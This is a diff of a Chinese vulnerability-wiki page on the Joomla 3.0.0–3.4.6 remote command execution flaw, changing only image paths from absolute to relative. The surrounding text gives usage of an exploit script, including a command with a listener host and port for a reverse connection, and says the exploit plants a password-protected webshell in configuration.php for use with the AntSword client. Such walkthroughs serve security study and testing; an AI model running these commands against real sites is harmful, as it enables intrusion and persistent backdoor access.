@@ -22,7 +22,7 @@ Joomla 3.0.0 至 3.4.6
 
     python3 test.py -t http://127.0.0.1:8080/
 
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId26.png)
+![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId26.png)
 
 显示"Vulnerable"证明存在漏洞
 
@@ -30,12 +30,12 @@ Joomla 3.0.0 至 3.4.6
 
     python3 test.py -t http://127.0.0.1:8080/ --exploit --lhost 192.168.31.126 --lport 2121
 
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId27.png)
+![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId27.png)
 
 执行成功
 
 并在"configuration.php"写入**随机密码**的一句话木马
-![](/Users/aresx/Documents/VulWiki/.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId28.png)
+![](./.resource/Joomla3-3.4.6远程命令执行漏洞/media/rId28.png)
 上图的密码为：kyevgbxjmwivdvegohfzwuukuzswxqquthlrsollpxzgiifumi
 
 蚁剑链接测试
